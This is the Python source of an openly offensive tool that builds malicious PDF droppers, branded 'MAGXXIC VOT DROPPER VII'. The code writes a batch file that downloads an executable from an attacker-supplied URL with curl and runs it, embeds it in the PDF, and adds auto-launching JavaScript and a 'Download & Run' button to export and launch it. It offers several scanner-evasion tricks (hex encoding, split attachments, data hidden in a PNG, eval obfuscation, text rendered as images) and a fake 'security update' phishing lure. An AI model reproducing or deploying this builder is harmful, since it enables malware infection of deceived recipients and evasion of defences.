import os
import sys
import img2pdf
import base64
import random
import string
import binascii
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.units import inch
import argparse
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, FloatObject
from PIL import Image, ImageDraw, ImageFont

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "magenta",
})

console = Console(theme=custom_theme)

def print_banner():
    banner = """
    ███╗   ███╗ █████╗  ██████╗ ██╗  ██╗██╗  ██╗██╗ ██████╗    ██╗   ██╗  ██████╗  ████████╗    ██╗   ██╗ ██╗ ██╗
    ████╗ ████║██╔══██╗██╔════╝ ██║  ██║╚██╗██╔╝██║██╔════╝    ██║   ██║ ██╔═══██╗ ╚══██╔══╝    ██║   ██║ ██║ ██║
    ██╔████╔██║███████║██║  ███╗███████║ ╚███╔╝ ██║██║         ██║   ██║ ██║   ██║    ██║       ██║   ██║ ██║ ██║
    ██║╚██╔╝██║██╔══██║██║   ██║╚════██║ ██╔██╗ ██║██║         ╚██╗ ██╔╝ ██║   ██║    ██║       ╚██╗ ██╔╝ ╚═╝ ╚═╝
    ██║ ╚═╝ ██║██║  ██║╚██████╔╝     ██║██╔╝ ██╗██║╚██████╗     ╚████╔╝  ╚██████╔╝    ██║        ╚████╔╝  ██╗ ██╗
    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝      ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═══╝    ╚═════╝     ╚═╝         ╚═══╝   ╚═╝ ╚═╝

                                       [bold white]MAGXXIC VOT DROPPER VII[/]
                                    [bold cyan]ADVANCED EVASION & SOCIAL ENGINEERING[/]
    """
    console.print(Panel(Text.from_markup(banner, justify="center"), border_style="highlight"))

def obfuscate_js(js_code):
    """Simple JS obfuscation using character codes."""
    char_codes = [ord(c) for c in js_code]
    return f"eval(String.fromCharCode({','.join(map(str, char_codes))}));"

def create_image_of_text(text_lines, filename):
    """Creates an image from text to evade OCR/Text scanners."""
    img = Image.new('RGB', (800, 1000), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    try:
        font = ImageFont.load_default()
    except:
        font = None

    y = 100
    for line in text_lines:
        d.text((100, y), line, fill=(0, 0, 0), font=font)
        y += 40
    img.save(filename)

def create_pdf_dropper(payload_url, custom_image, custom_text, output_pdf, evasion_method):
    """
    Creates a PDF dropper with advanced evasion and custom content.
    """

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the BAT file
        task1 = progress.add_task("Preparing payload...", total=1)
        bat_file = "update.bat"
        safe_url = payload_url.replace('"', '')
        raw_content = f'@echo off\ncurl -s -o "%TEMP%\\payload.exe" "{safe_url}"\nstart "" "%TEMP%\\payload.exe"\nexit\n'

        try:
            with open(bat_file, "w") as f:
                f.write(raw_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT: {e}[/]")
            return

        # 2. Design Content
        task2 = progress.add_task("Generating document content...", total=1)
        temp_pdf = "temp_content.pdf"

        try:
            c = canvas.Canvas(temp_pdf, pagesize=letter)

            # Handle Custom Image
            if custom_image and os.path.exists(custom_image):
                c.drawImage(custom_image, 0, 0, width=letter[0], height=letter[1], preserveAspectRatio=True, mask='auto')

            # Handle Custom Text
            lines = custom_text.split('\n')
            if evasion_method == "Image-Based PDF":
                create_image_of_text(lines, "temp_text.png")
                c.drawImage("temp_text.png", 0, 0, width=letter[0], height=letter[1])
                os.remove("temp_text.png")
            else:
                c.setFont('Helvetica-Bold', 18)
                y = letter[1] - inch
                for line in lines:
                    c.drawString(inch, y, line)
                    y -= 0.3*inch

            # Button (always added)
            btn_y = 3*inch
            c.setFillColorRGB(0.1, 0.4, 0.8)
            c.roundRect(inch, btn_y, 2.5*inch, 0.6*inch, 0.1*inch, fill=1)
            c.setFillColorRGB(1, 1, 1)
            c.setFont('Helvetica-Bold', 14)
            c.drawCentredString(2.25*inch, btn_y + 0.22*inch, "Download & Run")
            c.save()
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Content generation failed: {e}[/]")
            return

        # 3. Finalize with evasion and interactivity
        task3 = progress.add_task(f"Applying {evasion_method}...", total=1)
        try:
            writer = PdfWriter()
            base_reader = PdfReader(temp_pdf)
            for page in base_reader.pages:
                writer.add_page(page)

            # Define JS Trigger Logic
            if evasion_method == "Hex Encoding":
                with open(bat_file, "rb") as f: hex_data = binascii.hexlify(f.read())
                writer.add_attachment("update.dat", hex_data)
                js_payload = 'try { var d = this.getDataObjectContents("update.dat"); var h = util.stringFromStream(d); var s = ""; for(var i=0; i<h.length; i+=2){ s += String.fromCharCode(parseInt(h.substr(i,2),16)); } this.createDataObject("update.bat", s); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) { app.alert("Error: Please click the Download button manually."); }'
            elif evasion_method == "Split and Merge":
                with open(bat_file, "rb") as f: data = f.read()
                mid = len(data)//2
                writer.add_attachment("p1.bin", data[:mid])
                writer.add_attachment("p2.bin", data[mid:])
                js_payload = 'try { var d1 = util.stringFromStream(this.getDataObjectContents("p1.bin")); var d2 = util.stringFromStream(this.getDataObjectContents("p2.bin")); this.createDataObject("update.bat", d1+d2); this.exportDataObject({cName:"update.bat", nLaunch:2}); } catch(e) { app.alert("Error: Please click the Download button manually."); }'
            elif evasion_method == "Steganography":
                dummy_img = Image.new('RGB', (10, 10), color=(0,0,0))
                dummy_img.save("logo.png")
                with open(bat_file, "rb") as f_payload: p_bytes = f_payload.read()
                with open("logo.png", "ab") as f: f.write(b"!!START!!" + p_bytes + b"!!END!!")
                with open("logo.png", "rb") as f: writer.add_attachment("logo.png", f.read())
                js_payload = 'try { var s = util.stringFromStream(this.getDataObjectContents("logo.png")); var i1 = s.indexOf("!!START!!"); var i2 = s.indexOf("!!END!!"); if(i1!=-1 && i2!=-1){ var p = s.substring(i1+9, i2); this.createDataObject("update.bat", p); this.exportDataObject({cName:"update.bat", nLaunch:2}); } } catch(e) { app.alert("Error: Please click the Download button manually."); }'
                os.remove("logo.png")
            else: # None, Obfuscated JS, Image-Based
                with open(bat_file, "rb") as f: writer.add_attachment("update.bat", f.read())
                js_payload = 'try { this.exportDataObject({ cName: "update.bat", nLaunch: 2 }); } catch(e) { app.alert("Action required: Click the Download button to continue."); }'

            if evasion_method == "Obfuscated JavaScript":
                js_payload = obfuscate_js(js_payload)

            # Add Auto-Launch JS (OpenAction)
            writer.add_js(js_payload)

            # Add Clickable Button Annotation
            js_action = DictionaryObject({
                NameObject("/S"): NameObject("/JavaScript"),
                NameObject("/JS"): TextStringObject(js_payload),
            })

            # Rect matches the c.roundRect coordinates: (inch, 3*inch, 3.5*inch, 3.6*inch)
            # Coordinates: x1, y1, x2, y2
            annot = DictionaryObject({
                NameObject("/Type"): NameObject("/Annot"),
                NameObject("/Subtype"): NameObject("/Link"),
                NameObject("/Rect"): ArrayObject([FloatObject(inch), FloatObject(3*inch), FloatObject(inch + 2.5*inch), FloatObject(3*inch + 0.6*inch)]),
                NameObject("/Border"): ArrayObject([FloatObject(0), FloatObject(0), FloatObject(0)]),
                NameObject("/A"): js_action
            })

            writer.add_annotation(page_number=0, annotation=annot)

            with open(output_pdf, "wb") as f:
                writer.write(f)
            progress.update(task3, completed=1)
        except Exception as e:
            console.print(f"[error]Finalization failed: {e}[/]")
            return

        # 4. Cleanup
        finally:
            task4 = progress.add_task("Cleaning up...", total=1)
            for f in [bat_file, temp_pdf]:
                if os.path.exists(f): os.remove(f)
            progress.update(task4, completed=1)

    console.print(Panel(f"[success]GENERATION COMPLETE[/]\nFile: [highlight]{output_pdf}[/]\nMethod: [highlight]{evasion_method}[/]", border_style="success"))

def main():
    print_banner()

    payload_url = Prompt.ask("[info]Payload URL[/]", default="http://example.com/payload.exe")
    output_pdf = Prompt.ask("[info]Output Filename[/]", default="Update.pdf")
    if not output_pdf.endswith(".pdf"): output_pdf += ".pdf"

    custom_text = Prompt.ask("[info]Draft PDF Content[/]", default="URGENT: SECURITY UPDATE REQUIRED\n\nYour system has detected a critical vulnerability.\nPlease authorize the update to maintain security.")

    custom_image = None
    if Confirm.ask("[info]Add custom image/logo?[/]", default=False):
        custom_image = Prompt.ask("[info]Image Path[/]")

    methods = ["Image-Based PDF", "Split and Merge", "Obfuscated JavaScript", "Hex Encoding", "Steganography", "None"]
    table = Table(title="Evasion Methods")
    table.add_column("ID", style="cyan")
    table.add_column("Method", style="magenta")
    for i, m in enumerate(methods, 1): table.add_row(str(i), m)
    console.print(table)

    choice = Prompt.ask("[info]Select Evasion Method[/]", choices=[str(i) for i in range(1, len(methods)+1)], default="3")
    evasion_method = methods[int(choice)-1]

    if Confirm.ask("[success]Start Generation?[/]", default=True):
        create_pdf_dropper(payload_url, custom_image, custom_text, output_pdf, evasion_method)

if __name__ == "__main__":
    main()
